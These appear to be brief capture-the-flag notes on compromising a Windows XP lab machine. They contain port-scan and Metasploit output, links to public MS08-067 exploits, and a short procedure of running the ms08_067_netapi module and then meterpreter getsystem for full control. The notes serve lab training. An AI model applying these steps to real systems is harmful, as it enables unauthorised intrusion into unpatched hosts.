# recon
- port + version
```
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
```
- OS: Windows XP (Windows 2000 LAN Manager)
- 445 microsoft-ds  Windows XP microsoft-ds
  - [MS08-067](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)
  - [CVE-2008-4250](https://nvd.nist.gov/vuln/detail/CVE-2008-4250)
  - python exploit
    - https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
    - https://github.com/andyacer/ms08_067
    - [how to](https://ivanitlearning.wordpress.com/2019/03/03/ms08-067-exploitation-pass-the-hash-without-metasploit/)

```
msf5 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
```

# foot hold + root
- use `exploit/windows/smb/ms08_067_netapi`. set rhost, lhost and run.
- to get root: meterpreter getsystem.
